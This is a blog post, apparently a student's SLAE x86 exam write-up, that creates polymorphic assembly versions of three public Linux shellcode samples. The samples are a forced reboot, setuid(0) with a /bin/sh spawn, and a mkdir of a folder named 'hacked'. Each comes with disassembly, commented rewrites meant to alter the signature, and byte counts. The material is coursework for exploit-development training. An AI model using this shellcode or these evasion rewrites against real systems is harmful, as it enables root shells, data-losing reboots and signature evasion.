---
layout: post
title:  "SLAE x86 Exam - Assignment 6"
categories: certs slae 
---


## Assignment #6 - Polymorphic shellcode
_Student ID: **PA-7854**_

The assignment indications are as follows:
* Take up at least 3 shellcode samples from [shell-storm.org](http://shell-storm.org) and create polymorphic versions of them
* It cannot be larger than 150%
* Bonus if it ends up to be shorter

The code is available at [my github repo](https://github.com/0xKiewicz/SLAE)

The very first shellcode i choose is [Linux/x86 - hard reboot (without any message) and data will be lost - 29 bytes](http://shell-storm.org/shellcode/files/shellcode-638.php). 

#### 1. Hard reboot
Comments are in `at&t` syntax  which i don't like, so i just converted it to `intel` syntax:
```nasm
00000000  31C0              xor eax,eax
00000002  B058              mov al,0x58
00000004  BBADDEE1FE        mov ebx,0xfee1dead
00000009  B969191228        mov ecx,0x28121969
0000000E  BA67452301        mov edx,0x1234567
00000013  CD80              int 0x80
00000015  31C0              xor eax,eax
00000017  B001              mov al,0x1
00000019  31DB              xor ebx,ebx
0000001B  CD80              int 0x80
```
 
It simply executes the `reboot` syscall, which is `0x58` (88 in decimal), with the `magic1` (0xfee1dead) and `magic2` (0x28121969) set, to avoid failing. Also, the command to be executed is `RB_AUTOBOOT` (0x1234567), which prints a message and restarts immediately.

My polymorphic version of this is as follows, with each change explained with a comment:
```nasm
global _start
section .text
_start:
        xor     esi, esi 	; clear out ESI, instead of EAX
        mov     al,0x58
        mov     ebx,0xfee1dead
        mov     ecx,0x28121969
        mov     edx,0x1234567
        int     0x80

        mov     eax, esi	; Clear out EAX by copying ESI
        inc     eax		; Increment EAX by 1
        xor     ebx,ebx
        int     0x80
```

```bash
--snip--
Shellcode Length:  28
```
28 bytes length! That's awesome, it's one byte smaller than the original shellcode. 
Let's pick up another one.

#### 2. setuid(0) & /bin/sh 
The second one will be [Linux/x86 - setuid(0) & execve(/bin/sh,0,0) - 28 bytes](http://shell-storm.org/shellcode/files/shellcode-61.php).

This is the original shellcode:
```nasm
00000000  31DB              xor ebx,ebx
00000002  8D4317            lea eax,[ebx+0x17]
00000005  99                cdq
00000006  CD80              int 0x80
00000008  31C9              xor ecx,ecx
0000000A  51                push ecx
0000000B  686E2F7368        push dword 0x68732f6e
00000010  682F2F6269        push dword 0x69622f2f
00000015  8D410B            lea eax,[ecx+0xb]
00000018  89E3              mov ebx,esp
0000001A  CD80              int 0x80
```

It just executes the `setuid` syscall (`0x17` loaded into EAX), followed by the `execve` syscall (`0xb`) with the command `/bin/sh`.

This is my polymorphic version of it, again commenting the changes:
```nasm
	xor	ebx,ebx
	mul	ebx		; clear out EAX
	mov 	al, 0x17	; put 0x17 in the lower bits of EAX
	int	0x80	
	mul 	ebx		; clear out EAX
	xor 	ecx, ecx	
	push 	ecx
	push 	0x68732f6e
	push 	0x69622f2f
	mov 	al, 0xb		; put 0xb in the lower bits of EAX
	mov	ebx,esp
	int	0x80
```

```bash
--snip--
Shellcode length: 29 bytes
```
Great. This one was 29 bytes, meaning 1 byte bigger than the original one, still within the limits.

#### 3. mkdir 
The third and last shellcode to create a polymorphic version of is[Linux/x86 - mkdir() & exit() - 36 bytes](http://shell-storm.org/shellcode/files/shellcode-542.php).

This is the disassembled code:
```nasm
00000000  EB16              jmp short 0x18
00000002  5E                pop esi
00000003  31C0              xor eax,eax
00000005  884606            mov [esi+0x6],al
00000008  B027              mov al,0x27
0000000A  8D1E              lea ebx,[esi]
0000000C  66B9ED01          mov cx,0x1ed
00000010  CD80              int 0x80
00000012  B001              mov al,0x1
00000014  31DB              xor ebx,ebx
00000016  CD80              int 0x80
00000018  E8E5FFFFFF        call dword 0x2
0000001D  6861636B65        push dword 0x656b6361
00000022  64                fs
00000023  23                db 0x23
```
As the comment states, it creates a folder named _hacked_ and exit grafecully. 
This too is using the technique `JMP-CALL-POP`.

Here is my version, changes made are commented next to each instruction:

```nasm
	cdq			; clear out EDX
	mov eax, edx		; set EAX = 0
	xor ecx, ecx		; clear out ECX
	push ecx		; push NULL byte, next string terminator
	push dword 0x64646465 	; ddde
	push dword 0x6b636168 	; kcah
	mov al,0x27 		; mkdir syscall = 39 (decimal)
	mov ebx, esp		; pointer to string
	mov cx, 0x1ed		; mode
	int 0x80 
	mov al,0x1 
	xor ebx,ebx 
	int 0x80 
```

```bash
--snip--
Shellcode Length: 32
```

Awesome, this one is smaller than the original by 4 bytes!

With this, we finish up this assignment.
